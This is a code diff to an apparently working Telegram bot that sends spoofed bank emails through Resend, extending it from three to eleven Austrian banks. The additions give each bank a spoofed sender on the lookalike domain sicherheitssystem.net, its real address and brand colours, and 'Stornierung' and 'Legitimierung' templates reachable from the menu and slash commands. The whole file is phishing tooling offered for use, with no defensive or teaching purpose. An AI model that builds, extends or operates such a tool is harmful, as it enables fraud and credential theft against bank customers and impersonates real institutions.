@@ -1,4 +1,4 @@
-// Telegram bot for sending bank spoof emails (Volksbank / BAWAG / Raiffeisen) via Resend
+// Telegram bot for sending bank spoof emails (VB/BAWAG/RBI/Erste/bank99/HYPO NOE/Burgenland/Oberbank/DADAT/Dolomiten/Marchfelder) via Resend
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const corsHeaders = {
@@ -14,7 +14,18 @@ const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
 
 // ---------- Bank configuration ----------
-type BankKey = "vb" | "bawag" | "rbi";
+type BankKey =
+  | "vb"
+  | "bawag"
+  | "rbi"
+  | "erste"
+  | "bank99"
+  | "hyponoe"
+  | "burgenland"
+  | "oberbank"
+  | "dadat"
+  | "dolomiten"
+  | "marchfelder";
 
 type BankConfig = {
   key: BankKey;
@@ -73,6 +84,118 @@ const BANKS: Record<BankKey, BankConfig> = {
     domain: "rbinternational.com",
     schalter: "Raiffeisen-Schalter",
     filiale: "Raiffeisen-Filiale",
+  },
+  erste: {
+    key: "erste",
+    name: "Erste Bank",
+    fullName: "Erste Bank der oesterreichischen Sparkassen AG",
+    fromName: "Erste Bank",
+    fromEmail: "erste@sicherheitssystem.net",
+    accent: "#2870ed",
+    topbar: "#2870ed",
+    border: "#2870ed",
+    address: "Am Belvedere 1, 1100 Wien",
+    domain: "sparkasse.at",
+    schalter: "Erste-Bank-Schalter",
+    filiale: "Erste-Bank-Filiale",
+  },
+  bank99: {
+    key: "bank99",
+    name: "bank99",
+    fullName: "bank99 AG",
+    fromName: "bank99 AG",
+    fromEmail: "bank99@sicherheitssystem.net",
+    accent: "#1a1a1a",
+    topbar: "#ffdc00",
+    border: "#1a1a1a",
+    address: "Rennweg 44, 1030 Wien",
+    domain: "bank99.at",
+    schalter: "bank99-Schalter",
+    filiale: "bank99-Filiale",
+  },
+  hyponoe: {
+    key: "hyponoe",
+    name: "HYPO NOE",
+    fullName: "HYPO NOE Landesbank für Niederösterreich und Wien AG",
+    fromName: "HYPO NOE Landesbank",
+    fromEmail: "hyponoe@sicherheitssystem.net",
+    accent: "#142d59",
+    topbar: "#142d59",
+    border: "#142d59",
+    address: "Hypogasse 1, 3100 St. Pölten",
+    domain: "hyponoe.at",
+    schalter: "HYPO-NOE-Schalter",
+    filiale: "HYPO-NOE-Filiale",
+  },
+  burgenland: {
+    key: "burgenland",
+    name: "Bank Burgenland",
+    fullName: "HYPO-BANK BURGENLAND Aktiengesellschaft",
+    fromName: "Bank Burgenland AG",
+    fromEmail: "burgenland@sicherheitssystem.net",
+    accent: "#087edf",
+    topbar: "#087edf",
+    border: "#087edf",
+    address: "Neusiedler Straße 33, 7000 Eisenstadt",
+    domain: "bankburgenland.at",
+    schalter: "Bank-Burgenland-Schalter",
+    filiale: "Bank-Burgenland-Filiale",
+  },
+  oberbank: {
+    key: "oberbank",
+    name: "Oberbank",
+    fullName: "Oberbank AG",
+    fromName: "Oberbank AG",
+    fromEmail: "oberbank@sicherheitssystem.net",
+    accent: "#c90000",
+    topbar: "#c90000",
+    border: "#c90000",
+    address: "Untere Donaulände 28, 4020 Linz",
+    domain: "oberbank.at",
+    schalter: "Oberbank-Schalter",
+    filiale: "Oberbank-Filiale",
+  },
+  dadat: {
+    key: "dadat",
+    name: "DADAT Bank",
+    fullName: "Schelhammer Capital Bank AG (DADAT)",
+    fromName: "DADAT Bank",
+    fromEmail: "dadat@sicherheitssystem.net",
+    accent: "#ae3186",
+    topbar: "#ae3186",
+    border: "#ae3186",
+    address: "Goldschmiedgasse 3, 1010 Wien",
+    domain: "dadat.com",
+    schalter: "DADAT-Schalter",
+    filiale: "DADAT-Filiale",
+  },
+  dolomiten: {
+    key: "dolomiten",
+    name: "Dolomiten Bank",
+    fullName: "Dolomitenbank Osttirol-Kärnten eG",
+    fromName: "Dolomitenbank Osttirol-Kärnten",
+    fromEmail: "dolomiten@sicherheitssystem.net",
+    accent: "#f59401",
+    topbar: "#f59401",
+    border: "#f59401",
+    address: "Mühlgasse 6, 9900 Lienz",
+    domain: "dolomitenbank.at",
+    schalter: "Dolomitenbank-Schalter",
+    filiale: "Dolomitenbank-Filiale",
+  },
+  marchfelder: {
+    key: "marchfelder",
+    name: "Marchfelder Bank",
+    fullName: "Marchfelder Bank eG",
+    fromName: "Marchfelder Bank",
+    fromEmail: "marchfelder@sicherheitssystem.net",
+    accent: "#6bb354",
+    topbar: "#6bb354",
+    border: "#6bb354",
+    address: "Hauptstraße 27, 2230 Gänserndorf",
+    domain: "marchfelderbank.at",
+    schalter: "Marchfelder-Bank-Schalter",
+    filiale: "Marchfelder-Bank-Filiale",
   },
 };
 
@@ -174,7 +297,7 @@ function parseFlow(flow: string): { bank: BankKey; variant: Variant } | null {
   if (parts.length !== 2) return null;
   const [variant, bank] = parts as [string, string];
   if (variant !== "stornierung" && variant !== "legitimierung") return null;
-  if (bank !== "vb" && bank !== "bawag" && bank !== "rbi") return null;
+  if (!(bank in BANKS)) return null;
   return { bank: bank as BankKey, variant: variant as Variant };
 }
 
@@ -201,18 +324,27 @@ const sendMessage = (chat_id: number, text: string, extra: Record<string, unknow
 const answerCallback = (id: string, text?: string) =>
   tgCall("answerCallbackQuery", { callback_query_id: id, text });
 
+const MENU_ORDER: BankKey[] = [
+  "vb",
+  "bawag",
+  "rbi",
+  "erste",
+  "bank99",
+  "hyponoe",
+  "burgenland",
+  "oberbank",
+  "dadat",
+  "dolomiten",
+  "marchfelder",
+];
+
 async function sendStartMenu(chat_id: number) {
+  const inline_keyboard = MENU_ORDER.flatMap((k) => [
+    [{ text: `📄 ${BANKS[k].name}-Stornierung`, callback_data: `flow:stornierung_${k}` }],
+    [{ text: `🛡️ ${BANKS[k].name}-Legitimierung`, callback_data: `flow:legitimierung_${k}` }],
+  ]);
   await sendMessage(chat_id, "👋 <b>Bank Email-Bot</b>\n\nBitte wähle eine Vorlage:", {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "📄 Volksbank-Stornierung", callback_data: "flow:stornierung_vb" }],
-        [{ text: "🛡️ Volksbank-Legitimierung", callback_data: "flow:legitimierung_vb" }],
-        [{ text: "📄 BAWAG-Stornierung", callback_data: "flow:stornierung_bawag" }],
-        [{ text: "🛡️ BAWAG-Legitimierung", callback_data: "flow:legitimierung_bawag" }],
-        [{ text: "📄 Raiffeisen-Stornierung", callback_data: "flow:stornierung_rbi" }],
-        [{ text: "🛡️ Raiffeisen-Legitimierung", callback_data: "flow:legitimierung_rbi" }],
-      ],
-    },
+    reply_markup: { inline_keyboard },
   });
 }
 
@@ -351,16 +483,17 @@ async function sendEmail(flow: string, d: Record<string, string>): Promise<{ ok:
 }
 
 // ---------- Slash command aliases ----------
-const SLASH_TO_FLOW: Record<string, string> = {
-  "/stornierung_vb": "stornierung_vb",
-  "/stornierung_bawag": "stornierung_bawag",
-  "/stornierung_rbi": "stornierung_rbi",
-  "/legitimierung_vb": "legitimierung_vb",
-  "/legitimierung_bawag": "legitimierung_bawag",
-  "/legitimierung_rbi": "legitimierung_rbi",
-  "/stornierung": "stornierung_vb",
-  "/legitimierung": "legitimierung_vb",
-};
+const SLASH_TO_FLOW: Record<string, string> = (() => {
+  const map: Record<string, string> = {
+    "/stornierung": "stornierung_vb",
+    "/legitimierung": "legitimierung_vb",
+  };
+  for (const k of Object.keys(BANKS) as BankKey[]) {
+    map[`/stornierung_${k}`] = `stornierung_${k}`;
+    map[`/legitimierung_${k}`] = `legitimierung_${k}`;
+  }
+  return map;
+})();
 
 // ---------- Update handler ----------
 async function handleUpdate(update: any) {
@@ -440,19 +573,22 @@ async function handleUpdate(update: any) {
     return;
   }
   if (text === "/hilfe" || text === "/help") {
+    const senderLines = (Object.keys(BANKS) as BankKey[]).map(
+      (k) => `• ${BANKS[k].name}: <code>${BANKS[k].fromName} &lt;${BANKS[k].fromEmail}&gt;</code>`,
+    );
+    const stornoCmds = (Object.keys(BANKS) as BankKey[]).map((k) => `/stornierung_${k}`).join(", ");
+    const legitCmds = (Object.keys(BANKS) as BankKey[]).map((k) => `/legitimierung_${k}`).join(", ");
     const help = [
       "<b>📬 Bank Email-Bot – Hilfe</b>",
       "",
-      "Dieser Bot versendet Bank-Emails (Volksbank, BAWAG, Raiffeisen) über Resend.",
+      "Dieser Bot versendet Bank-Emails über Resend.",
       "Der Absender wird automatisch je nach Vorlage gesetzt:",
-      "• Volksbank: <code>Volksbank Wien AG &lt;volksbank@sicherheitsystem.net&gt;</code>",
-      "• BAWAG: <code>BAWAG PSK &lt;bawag@sicherheitsystem.net&gt;</code>",
-      "• Raiffeisen: <code>Raiffeisen Bank International AG &lt;raiffeisen@sicherheitsystem.net&gt;</code>",
+      ...senderLines,
       "",
       "<b>Befehle:</b>",
       "/start – Bot starten und Vorlage auswählen",
-      "/stornierung_vb, /stornierung_bawag, /stornierung_rbi",
-      "/legitimierung_vb, /legitimierung_bawag, /legitimierung_rbi",
+      stornoCmds,
+      legitCmds,
       "/abbrechen – aktuellen Vorgang abbrechen",
       "/hilfe – diese Übersicht anzeigen",
       "",
